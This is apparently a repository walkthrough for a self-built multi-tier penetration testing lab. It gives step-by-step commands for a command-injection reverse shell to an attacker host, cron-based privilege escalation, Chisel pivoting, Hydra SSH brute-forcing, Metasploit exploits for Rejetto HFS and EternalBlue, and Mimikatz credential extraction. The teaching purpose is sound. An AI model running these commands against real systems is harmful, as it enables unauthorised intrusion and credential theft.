#  Attack Walkthrough: Multi-Tier Penetration Testing Lab

This document provides a **step-by-step attack guide** for the multi-tier network lab setup. The goal is to demonstrate:
 Initial Access  
 Privilege Escalation  
 Network Pivoting  
 Lateral Movement  
 Post-Exploitation

---

##  Lab Topology Recap
```bash
[ Attacker Kali/Parrot/Ubuntu ] (External) ---[192.168.1.0/24]---
|
[Ubuntu Public Server] (192.168.1.10, 10.10.10.10)
|
[10.10.10.0/24]
|
[Internal Ubuntu] (10.10.10.20, 192.168.2.10)
|
[192.168.2.0/24]
|
[Windows Server 2012] (192.168.2.50) [Windows 7] (192.168.2.60)
```
---

## 1️ Initial Access: Command Injection on Public Server

### Target: **Ubuntu Public Server (192.168.1.10)**

- **Service**: Apache Web Server hosting vulnerable command injection page.
- **Exploit**:
  - Find the vulnerable parameter (e.g., `ping` feature in web form).
  - Inject commands:

    ```bash
    127.0.0.1; bash -i >& /dev/tcp/<Attacker-IP>/4444 0>&1
    ```
    
- **Listener**:
    ```bash
  nc -lvnp 4444
    ```
    ###Shell Acquired: www-data

  ----


## 2️ Privilege Escalation on Public Server (Ubuntu)
Method: Cronjob Abuse
Check /etc/crontab or /etc/cron.d/* for writable scripts.

Example:

```bash
cat /etc/crontab
* * * * * /path/to/priv_esc.sh runs every minute.
```

Inject reverse shell payload:

```bash
echo "bash -i >& /dev/tcp/<Attacker-IP>/5555 0>&1" >> /path/to/priv_esc.sh
```

Start listener:

```bash
nc -lvnp 5555
```

Shell escalates to root!

---


## 3️ Pivoting to Internal Network
Tool: Chisel for SOCKS Proxy

On Public Ubuntu (root):

```bash
./chisel server -p 8000 --reverse
```

On Attacker Machine:

```bash
./chisel client <Public-Server-IP>:8000 R:socks
```

Configure /etc/proxychains.conf:

```bash
socks5 127.0.0.1 1080
```

Test access to Internal Ubuntu:

```bash
proxychains nmap -p 22 10.10.10.20
```

----

## 4️ Internal Ubuntu Attack: SSH Brute-Force + Priv Esc
SSH Bruteforce with Hydra:

```bash
proxychains hydra -l testuser -P rockyou.txt ssh://10.10.10.20
```

Login:
```bash
proxychains ssh testuser@10.10.10.20
```

Privilege Escalation via find Misconfiguration:

```bash
sudo find . -exec /bin/sh \; -quit
```

Shell escalates to root!

-----

## 5️ Internal Enumeration: Nmap + Metasploit
From Internal Ubuntu (root):

```bash
nmap -sS 192.168.2.0/24
```

Identify targets:
```bash
Windows Server 2012 (192.168.2.50)

Windows 7 (192.168.2.60)
```

---


## 6️ Exploit Windows Server 2012: Rejetto HFS 2.3 RCE

Metasploit Module:

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 192.168.2.50
set LHOST 192.168.2.10
set LPORT 4444
run
```

Gain SYSTEM shell on Windows Server 2012!

----


## 7️ Exploit Windows 7: MS17-010 (EternalBlue)

Metasploit Module:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.2.60
set LHOST 192.168.2.10
set LPORT 5555
run
```

Gain SYSTEM shell on Windows 7!

## 8️ Final Post-Exploitation

**Extract hashes with Mimikatz.**
**Pivot further if desired.**
**Clean up lab after tests.**


---

## ⚠️ Disclaimer
This lab is for educational purposes only. Do NOT attempt these techniques on unauthorized systems.

---

##  Attack chain complete! 
Feel free to fork this repository and build your own multi-tier lab for learning and research!
